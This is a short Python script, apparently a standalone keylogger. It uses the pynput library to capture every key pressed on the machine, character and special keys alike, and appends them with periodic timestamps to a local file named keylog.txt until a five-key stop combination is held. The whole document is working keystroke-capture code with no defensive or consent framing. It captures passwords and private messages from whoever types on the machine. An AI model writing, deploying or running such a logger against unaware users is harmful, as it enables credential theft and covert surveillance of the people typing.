from pynput.keyboard import Key, Listener
from datetime import datetime, timedelta

# Define the file where keystrokes will be logged
log_file = "keylog.txt"

# Time interval for adding timestamps (e.g., every 2 minutes)
timestamp_interval = timedelta(minutes=2)
last_timestamp = datetime.now()

# Define the stop combination and a set to track pressed keys
stop_combination = {'s', 't', 'o', 'p', 'm'}
current_keys = set()
stop_detected = False

# Function to write keystrokes to the file with timestamp if needed
def on_press(key):
    global last_timestamp, stop_detected

    # Check if enough time has passed to add a new timestamp
    current_time = datetime.now()
    if current_time - last_timestamp >= timestamp_interval:
        with open(log_file, "a") as f:
            f.write(f"\n\n[{current_time.strftime('%Y-%m-%d %H:%M:%S')}] - New Session\n\n")
        last_timestamp = current_time  # Update last timestamp

    # Add key to current keys set if it's part of the stop combination
    try:
        if key.char in stop_combination:
            current_keys.add(key.char)
        # Log key to file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (non-character keys)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

    # Check if the stop combination is fully pressed
    if current_keys == stop_combination:
        stop_detected = True
        return False  # Stop the listener

# Function to remove keys from the current set on release
def on_release(key):
    try:
        if key.char in current_keys:
            current_keys.remove(key.char)
    except AttributeError:
        pass  # Ignore special keys

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
